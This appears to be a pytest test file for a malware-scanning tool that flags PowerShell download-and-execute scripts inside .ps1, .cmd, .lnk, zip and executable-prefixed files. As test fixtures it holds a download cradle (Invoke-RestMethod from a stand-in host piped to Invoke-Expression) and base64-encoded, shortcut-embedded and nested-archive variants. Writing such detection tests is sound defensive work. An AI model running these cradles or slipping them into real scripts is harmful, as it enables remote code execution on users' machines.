from base64 import b64encode
import struct
import zipfile

from sentinel.bc_scan import scan_folder
from sentinel.bc_script_analysis import inspect_script


# Documentation-only domain. These bytes are never executed.
FLOW = "$body = Invoke-RestMethod 'https://example.invalid/payload'; Invoke-Expression $body"


def test_lexical_flow_and_benign_neighbors():
    assert inspect_script(FLOW.encode("utf-16"), ".ps1")
    assert not inspect_script(b"# IEX (IRM https://example.invalid)\nWrite-Output 'IEX (IRM https://example.invalid)'", ".ps1")
    assert not inspect_script(b"IRM https://example.invalid; Write-Output IEX", ".ps1")
    assert not inspect_script(FLOW.replace("; Invoke-Expression", "; $body = 'local'; Invoke-Expression").encode(), ".ps1")


def test_encoded_batch_and_unicode_link():
    encoded = b64encode(FLOW.encode("utf-16-le"))
    args = b"-EncodedCommand " + encoded
    assert inspect_script(b"@powershell.exe " + args, ".cmd")
    harmless = b64encode("Write-Output 'hello'".encode("utf-16-le"))
    assert not inspect_script(b"powershell.exe -e " + harmless, ".cmd")
    header = bytes.fromhex("4c0000000114020000000000c000000000000046")
    link = header + struct.pack("<I", 0xa0) + bytes(52)
    link += struct.pack("<H", len(args)) + args.decode("ascii").encode("utf-16-le")
    assert inspect_script(link, ".lnk")


def test_scan_reports_zip_script_advisory_and_malformed_link(tmp_path):
    with zipfile.ZipFile(tmp_path / "test.zip", "w") as archive:
        archive.writestr("document.ps1", FLOW)
    (tmp_path / "broken.lnk").write_bytes(b"incomplete")
    result = scan_folder(tmp_path)
    assert result["files"] == 2 and result["skipped"] == 1
    assert result["findings"][0]["source"] == "euristica statica BC"
    assert "isolate_path" not in result["findings"][0]

def test_powershell_continuation_preserves_download_flow():
    for newline in ("\n", "\r\n"):
        continued = f"IEX (`{newline}  IRM 'https://example.invalid')"
        assert inspect_script(continued.encode(), ".ps1")
        assert not inspect_script(f"# {continued}".encode(), ".ps1")


def test_corrupt_zip_member_does_not_hide_later_script(tmp_path):
    path = tmp_path / "mixed.zip"
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_STORED) as archive:
        archive.writestr("first.txt", b"unique inert content")
        archive.writestr("second.ps1", FLOW)
    path.write_bytes(path.read_bytes().replace(b"unique inert content", b"Unique inert content", 1))
    result = scan_folder(tmp_path)
    assert result["skipped"] == 1
    assert "first.txt" in result["errors"][0]
    assert any("second.ps1" in hit["path"] for hit in result["findings"])


def test_nested_zip_is_scanned_with_shared_member_budget(tmp_path, monkeypatch):
    import io

    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as archive:
        archive.writestr("script.ps1", FLOW)
    with zipfile.ZipFile(tmp_path / "outer.zip", "w") as archive:
        archive.writestr("inner.zip", inner.getvalue())
    result = scan_folder(tmp_path)
    assert result["skipped"] == 0
    assert any("inner.zip" in hit["path"] and "script.ps1" in hit["path"]
               for hit in result["findings"])
    monkeypatch.setattr("sentinel.bc_scan.MAX_ARCHIVE_MEMBERS", 1)
    limited = scan_folder(tmp_path)
    assert limited["skipped"] == 1
    assert not limited["findings"]


def test_sibling_archives_share_budget_and_deeper_zip_is_disclosed(tmp_path, monkeypatch):
    import io

    def archive_bytes(name, payload):
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, "w") as archive:
            archive.writestr(name, payload)
        return stream.getvalue()

    leaf = archive_bytes("script.ps1", FLOW)
    with zipfile.ZipFile(tmp_path / "siblings.zip", "w") as archive:
        archive.writestr("one.zip", leaf)
        archive.writestr("two.zip", leaf)
    monkeypatch.setattr("sentinel.bc_scan.MAX_ARCHIVE_MEMBERS", 3)
    result = scan_folder(tmp_path)
    assert len(result["findings"]) == 1
    assert result["skipped"] == 1
    assert "two.zip" in result["errors"][0]
    monkeypatch.setattr("sentinel.bc_scan.MAX_ARCHIVE_MEMBERS", 256)
    (tmp_path / "siblings.zip").unlink()
    (tmp_path / "deep.zip").write_bytes(archive_bytes("middle.zip", archive_bytes("inner.zip", leaf)))
    deep = scan_folder(tmp_path)
    assert deep["skipped"] == 1
    assert "Archivio annidato non aperto" in deep["errors"][0]
    assert not deep["findings"]


def test_module_qualified_download_and_evaluation():
    flow = r"Microsoft.PowerShell.Utility\Invoke-Expression (Microsoft.PowerShell.Utility\Invoke-RestMethod 'https://example.invalid')"
    assert inspect_script(flow.encode(), ".ps1")
    assert not inspect_script(("# " + flow).encode(), ".ps1")
    assert not inspect_script(("Write-Output '" + flow.replace("'", '"') + "'").encode(), ".ps1")


def test_prefixed_zip_with_executable_suffix_is_inspected(tmp_path):
    import io

    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as archive:
        archive.writestr("script.ps1", FLOW)
    target = tmp_path / "carrier.exe"
    target.write_bytes(b"MZ" + bytes(510) + stream.getvalue())
    result = scan_folder(tmp_path)
    assert result["files"] == 1
    assert result["skipped"] == 0
    assert any("script.ps1" in hit["path"] for hit in result["findings"])
